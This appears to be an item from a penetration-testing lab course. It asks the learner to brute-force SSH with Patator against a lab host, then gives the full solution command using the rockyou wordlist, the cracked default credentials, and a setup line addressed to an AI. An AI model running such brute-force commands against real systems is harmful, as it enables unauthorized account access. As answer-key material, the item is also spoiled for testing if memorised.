# Q289 — Patator Multi-Service Brute Force

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | System Hacking / Password Cracking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `patator` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use Patator to brute force SSH login. Patator uses a different syntax than Hydra. Report the syntax and cracked password."

---

## 🎯 Flag Format

```
user=<username>; password=<pass>; tool=patator
```

---

## ✅ Solution

```bash
patator ssh_login host=192.168.52.129 user=msfadmin password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
```

**Answer:** `user=msfadmin; password=msfadmin; tool=patator`

---

## 🤖 Claude Setup Prompt

Ensure SSH on target. Report back: "Lab ready for Q289"
